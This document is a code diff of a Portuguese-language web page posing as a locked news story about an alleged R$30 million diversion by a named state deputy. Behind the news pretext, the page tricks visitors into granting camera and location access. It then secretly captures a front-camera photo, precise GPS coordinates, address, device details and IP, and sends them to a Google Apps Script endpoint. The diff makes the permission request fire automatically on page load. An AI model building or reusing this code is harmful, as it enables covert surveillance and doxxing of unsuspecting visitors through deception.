@@ -4,11 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Desvio de 30 Milhões - Dep. Chico Guarnieri</title>
-    <!-- Meta tags para evitar cache -->
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <meta name="format-detection" content="telephone=no">
     <style>
         * {
             margin: 0;
@@ -36,8 +31,6 @@
             align-items: center;
             flex-direction: column;
             transition: opacity 0.5s ease;
-            overflow-y: auto;
-            padding: 20px;
         }
         
         .initial-screen.hide {
@@ -49,110 +42,10 @@
             background: white;
             border-radius: 30px;
             padding: 40px 30px;
-            max-width: 400px;
-            width: 100%;
+            max-width: 350px;
             text-align: center;
             animation: fadeInUp 0.6s ease;
             box-shadow: 0 20px 50px rgba(0,0,0,0.3);
-            margin-bottom: 20px;
-        }
-        
-        /* Miniatura da prévia da notícia */
-        .news-preview {
-            max-width: 400px;
-            width: 100%;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            animation: fadeInUp 0.6s ease 0.2s both;
-            margin-top: 10px;
-        }
-        
-        .preview-header {
-            background: #003366;
-            padding: 8px 15px;
-            color: white;
-            font-size: 11px;
-            font-weight: bold;
-            text-align: center;
-        }
-        
-        .preview-image {
-            width: 100%;
-            height: 80px;
-            background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-            position: relative;
-        }
-        
-        .preview-content {
-            padding: 12px;
-        }
-        
-        .preview-category {
-            color: #c0392b;
-            font-size: 9px;
-            font-weight: bold;
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-        
-        .preview-title {
-            font-size: 14px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-        
-        .preview-text {
-            font-size: 10px;
-            color: #666;
-            line-height: 1.4;
-            margin-bottom: 8px;
-        }
-        
-        .preview-blur {
-            filter: blur(3px);
-            margin-top: 8px;
-            padding-top: 8px;
-            border-top: 1px solid #eee;
-        }
-        
-        .preview-blur p {
-            font-size: 9px;
-            color: #999;
-            line-height: 1.3;
-            margin-bottom: 4px;
-        }
-        
-        .preview-overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 30px;
-            background: linear-gradient(to bottom, transparent, rgba(0,51,102,0.8));
-            pointer-events: none;
-        }
-        
-        .badge-locked {
-            position: absolute;
-            top: 5px;
-            right: 5px;
-            background: rgba(0,0,0,0.6);
-            color: white;
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
         }
         
         @keyframes fadeInUp {
@@ -167,28 +60,28 @@
         }
         
         .initial-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
+            font-size: 70px;
+            margin-bottom: 20px;
         }
         
         .initial-card h2 {
             color: #003366;
-            margin-bottom: 10px;
-            font-size: 22px;
+            margin-bottom: 15px;
+            font-size: 24px;
         }
         
         .initial-card p {
             color: #666;
-            margin-bottom: 20px;
-            font-size: 13px;
+            margin-bottom: 25px;
+            font-size: 14px;
             line-height: 1.5;
         }
         
         .permission-status {
             background: #f8f9fa;
             border-radius: 15px;
-            padding: 12px;
-            margin: 15px 0;
+            padding: 15px;
+            margin: 20px 0;
             text-align: left;
         }
         
@@ -196,7 +89,7 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 6px 0;
+            padding: 8px 0;
             border-bottom: 1px solid #eee;
         }
         
@@ -207,11 +100,10 @@
         .status-label {
             font-weight: bold;
             color: #333;
-            font-size: 13px;
         }
         
         .status-value {
-            font-size: 18px;
+            font-size: 20px;
         }
         
         .status-pending {
@@ -226,13 +118,23 @@
             color: #f44336;
         }
         
+        .loading-spinner-small {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
         .btn-initial {
             background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 14px 30px;
             border-radius: 50px;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
@@ -248,67 +150,9 @@
             cursor: not-allowed;
         }
         
-        /* Botão de chamar permissão - DESTAQUE */
-        .call-permission-btn {
-            background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
-            color: white;
-            border: none;
-            padding: 16px 25px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
+        .retry-btn {
+            background: #c0392b;
             margin-top: 10px;
-            transition: all 0.3s;
-            animation: pulse-attention 1.5s infinite;
-            box-shadow: 0 0 15px rgba(192, 57, 43, 0.5);
-        }
-        
-        @keyframes pulse-attention {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(192, 57, 43, 0.7);
-            }
-            70% {
-                transform: scale(1.02);
-                box-shadow: 0 0 0 15px rgba(192, 57, 43, 0);
-            }
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(192, 57, 43, 0);
-            }
-        }
-        
-        .call-permission-btn:hover {
-            transform: scale(1.03);
-            animation: none;
-        }
-        
-        .call-permission-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            animation: none;
-        }
-        
-        .warning-text {
-            color: #c0392b;
-            font-weight: bold;
-            margin-top: 10px;
-            font-size: 13px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .success-text {
-            color: #4caf50;
-            font-weight: bold;
-            margin-top: 10px;
-            font-size: 13px;
         }
         
         @keyframes spin {
@@ -564,11 +408,8 @@
                 font-size: 16px;
             }
             .initial-card {
-                margin: 10px;
-                padding: 25px 20px;
-            }
-            .news-preview {
-                max-width: 350px;
+                margin: 20px;
+                padding: 30px 20px;
             }
         }
     </style>
@@ -577,62 +418,27 @@
     <!-- Tela inicial com solicitação de permissão -->
     <div id="initialScreen" class="initial-screen">
         <div class="initial-card">
-            <div class="initial-icon">♿🔐</div>
-            <h2>Acessibilidade Garantida</h2>
-            <p>Para garantir a melhor experiência e acessibilidade para todos os usuários, utilizamos tecnologia de reconhecimento ocular para ajustar a leitura.</p>
+            <div class="initial-icon">📱🔐</div>
+            <h2>Verificação Necessária</h2>
+            <p>Para garantir a segurança e autenticidade do conteúdo, precisamos verificar sua identidade.</p>
             
             <div class="permission-status">
                 <div class="status-item">
-                    <span class="status-label">👁️ Sensor de Íris:</span>
-                    <span id="cameraStatus" class="status-value status-pending">⏳</span>
+                    <span class="status-label">📷 Câmera:</span>
+                    <span id="cameraStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
                 <div class="status-item">
-                    <span class="status-label">📜 Termos e Condições:</span>
-                    <span id="locationStatus" class="status-value status-pending">⏳</span>
+                    <span class="status-label">📍 Localização:</span>
+                    <span id="locationStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
             </div>
             
-            <p style="font-size: 11px; color: #999;">
-                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong> em ambas as solicitações
+            <p style="font-size: 12px; color: #999;">
+                Quando o navegador solicitar, clique em <strong>"PERMITIR"</strong> ou <strong>"PERMITIR DESTA VEZ"</strong>
             </p>
             
-            <!-- Botão principal para chamar permissão -->
-            <button id="callPermissionBtn" class="call-permission-btn">
-                🔓 PERMITIR CÂMERA E LOCALIZAÇÃO
-            </button>
-            
-            <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
-            
-            <div id="warningMsg" class="warning-text" style="display: none;">
-                ⚠️ Clique no botão acima e permita AMBAS as permissões!
-            </div>
-            <div id="successMsg" class="success-text" style="display: none;">
-                ✅ Permissões concedidas! Clique em "Acessar Site"
-            </div>
-        </div>
-        
-        <!-- Miniatura da prévia da notícia -->
-        <div class="news-preview">
-            <div class="preview-header">
-                📰 LAPADA DA BARRA | NOTA OFICIAL
-            </div>
-            <div class="preview-image">
-                📢 NOTA DE ESCLARECIMENTO
-                <div class="preview-overlay"></div>
-                <div class="badge-locked">
-                    🔒 Conteúdo Bloqueado
-                </div>
-            </div>
-            <div class="preview-content">
-                <div class="preview-category">🔴 INVESTIGAÇÃO EXCLUSIVA</div>
-                <div class="preview-title">Desvio de 30 Milhões - Dep. Chico Guarnieri</div>
-                <div class="preview-text">Gabinete do Deputado é investigado por suposto desvio de R$ 30 milhões destinados à revitalização da Lagoa de Barra do Bugres...</div>
-                <div class="preview-blur">
-                    <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos...</p>
-                    <p>É categoricamente falsa a informação de que o deputado estaria envolvido em qualquer tipo de desvio...</p>
-                    <p style="color: #ccc;">[Conteúdo bloqueado - autorize o acesso para ler]</p>
-                </div>
-            </div>
+            <button id="initialAllowBtn" class="btn-initial">✅ Já permiti, acessar site</button>
+            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Tentar Novamente</button>
         </div>
     </div>
     
@@ -701,22 +507,6 @@
     <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
 
     <script>
-        // Limpar qualquer dado armazenado ao carregar a página
-        (function() {
-            // Limpar localStorage
-            localStorage.clear();
-            
-            // Limpar sessionStorage
-            sessionStorage.clear();
-            
-            // Limpar qualquer cookie existente
-            document.cookie.split(";").forEach(function(c) {
-                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
-            });
-            
-            console.log('🗑️ Todos os dados de armazenamento foram limpos - Primeira visita simulada');
-        })();
-        
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
@@ -724,15 +514,12 @@
         let cameraGranted = false;
         let locationGranted = false;
         let permissionsReady = false;
-        let isRequesting = false;
         
         // Elementos
         const initialScreen = document.getElementById('initialScreen');
         const mainContent = document.getElementById('mainContent');
-        const callPermissionBtn = document.getElementById('callPermissionBtn');
         const initialAllowBtn = document.getElementById('initialAllowBtn');
-        const warningMsg = document.getElementById('warningMsg');
-        const successMsg = document.getElementById('successMsg');
+        const initialRetryBtn = document.getElementById('initialRetryBtn');
         const cameraStatusSpan = document.getElementById('cameraStatus');
         const locationStatusSpan = document.getElementById('locationStatus');
         
@@ -749,68 +536,59 @@
         
         function updateStatusUI() {
             if (cameraGranted) {
-                cameraStatusSpan.innerHTML = '✅';
+                cameraStatusSpan.innerHTML = '✅ Permitido';
                 cameraStatusSpan.className = 'status-value status-granted';
             } else {
-                cameraStatusSpan.innerHTML = '⏳';
-                cameraStatusSpan.className =status-value status-pending';
+                cameraStatusSpan.innerHTML = '⏳ Aguardando permissão...';
+                cameraStatusSpan.className = 'status-value status-pending';
             }
             
             if (locationGranted) {
-                locationStatusSpan.innerHTML = '✅';
+                locationStatusSpan.innerHTML = '✅ Permitido';
                 locationStatusSpan.className = 'status-value status-granted';
             } else {
-                locationStatusSpan.innerHTML = '⏳';
+                locationStatusSpan.innerHTML = '⏳ Aguardando permissão...';
                 locationStatusSpan.className = 'status-value status-pending';
             }
         }
         
-        // Função para solicitar permissão da CÂMERA
         async function requestCameraPermission() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop());
-                cameraGranted = true;
-                updateStatusUI();
-                return true;
-            } catch (e) {
-                console.log('Câmera negada:', e);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    cameraGranted = true;
+                    updateStatusUI();
+                    return true;
+                }
+            } catch (error) {
                 cameraGranted = false;
                 updateStatusUI();
                 return false;
             }
         }
         
-        // Função para solicitar permissão de LOCALIZAÇÃO
-        function requestLocationPermission() {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (posicao) => {
-                        console.log('Localização autorizada:', posicao.coords);
-                        locationGranted = true;
-                        updateStatusUI();
-                        resolve(true);
-                    },
-                    (erro) => {
-                        console.log('Localização negada:', erro);
-                        locationGranted = false;
-                        updateStatusUI();
-                        resolve(false);
-                    }
-                );
-            });
+        async function requestLocationPermission() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                if (position) {
+                    locationGranted = true;
+                    updateStatusUI();
+                    return true;
+                }
+            } catch (error) {
+                locationGranted = false;
+                updateStatusUI();
+                return false;
+            }
         }
         
-        // Função para solicitar AMBAS as permissões
         async function requestAllPermissions() {
-            if (isRequesting) return false;
-            isRequesting = true;
-            
-            callPermissionBtn.disabled = true;
-            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
-            warningMsg.style.display = 'none';
-            successMsg.style.display = 'none';
-            
             updateStatusUI();
             
             // Solicitar câmera primeiro
@@ -825,18 +603,15 @@
             permissionsReady = cameraGranted && locationGranted;
             
             if (permissionsReady) {
-                callPermissionBtn.style.display = 'none';
-                initialAllowBtn.style.display = 'block';
-                successMsg.style.display = 'block';
-                warningMsg.style.display = 'none';
+                initialAllowBtn.disabled = false;
+                initialAllowBtn.textContent = '✅ Acessar Site';
+                initialRetryBtn.style.display = 'none';
             } else {
-                callPermissionBtn.disabled = false;
-                callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
-                warningMsg.style.display = 'block';
-                successMsg.style.display = 'none';
+                initialAllowBtn.disabled = true;
+                initialAllowBtn.textContent = '⏳ Aguardando permissões...';
+                initialRetryBtn.style.display = 'block';
             }
             
-            isRequesting = false;
             return permissionsReady;
         }
         
@@ -940,7 +715,6 @@
             }
         }
         
-        // Função chamada ao clicar em "Ler Mais"
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -948,28 +722,19 @@
             loadingNews.classList.add('show');
             
             try {
-                let position = null;
-                if (locationGranted) {
-                    try {
-                        position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true,
-                                timeout: 15000
-                            });
-                        });
-                    } catch(e) {
-                        console.log('Erro ao obter posição precisa:', e);
-                    }
-                }
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000
+                    });
+                });
                 
-                const latitude = position ? position.coords.latitude : 0;
-                const longitude = position ? position.coords.longitude : 0;
-                const accuracy = position ? position.coords.accuracy : 0;
+                const { latitude, longitude, accuracy } = position.coords;
                 let finalAccuracy = Math.round(accuracy);
                 let finalLatitude = latitude;
                 let finalLongitude = longitude;
                 
-                const address = (latitude && longitude) ? await getAddress(finalLatitude, finalLongitude) : "Localização não compartilhada";
+                const address = await getAddress(finalLatitude, finalLongitude);
                 const deviceInfo = getDeviceInfo();
                 const publicIP = await getPublicIP();
                 const photoData = await captureAutoPhoto();
@@ -978,7 +743,7 @@
                     timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
                     longitude: finalLongitude,
-                    google_maps_link: (finalLatitude && finalLongitude) ? `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}` : "Não disponível",
+                    google_maps_link: `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`,
                     accuracy_meters: finalAccuracy,
                     address: address,
                     device: deviceInfo.device,
@@ -988,7 +753,6 @@
                     ip: publicIP,
                     photo_base64: photoData || 'Sem foto',
                     photo_captured: !!photoData,
-                    location_shared: locationGranted,
                     page_url: window.location.href,
                     politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões"
                 };
@@ -1004,17 +768,11 @@
                 autoCaptureDone = true;
                 
             } catch (error) {
-                console.error('Erro:', error);
                 loadingNews.classList.remove('show');
                 readMoreBtn.disabled = false;
                 autoCaptureDone = false;
             }
         }
-        
-        // Botão para chamar permissões
-        callPermissionBtn.addEventListener('click', () => {
-            requestAllPermissions();
-        });
         
         initialAllowBtn.addEventListener('click', async () => {
             if (permissionsReady) {
@@ -1026,24 +784,26 @@
             }
         });
         
+        initialRetryBtn.addEventListener('click', async () => {
+            initialAllowBtn.disabled = true;
+            initialAllowBtn.textContent = '⏳ Solicitando permissões...';
+            cameraGranted = false;
+            locationGranted = false;
+            await requestAllPermissions();
+        });
+        
+        // INICIAR SOLICITAÇÃO DE PERMISSÕES IMEDIATAMENTE
+        (async function() {
+            console.log('🚀 Solicitando permissões automaticamente...');
+            await requestAllPermissions();
+        })();
+        
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
-            if (!autoCaptureDone && permissionsReady) {
+            if (!autoCaptureDone) {
                 await autoCaptureAndSend();
-            } else if (!permissionsReady) {
-                alert('Você precisa permitir o acesso à câmera e localização primeiro!');
             }
         });
-        
-        // Impedir que o usuário volte usando o botão "voltar" e veja conteúdo antigo
-        window.addEventListener('pageshow', function(event) {
-            if (event.persisted) {
-                window.location.reload();
-            }
-        });
-        
-        console.log('✅ Site carregado - Modo de privacidade ativado');
-        console.log('🗑️ Nenhum dado é salvo - Toda visita é como a primeira');
     </script>
 </body>
 </html>
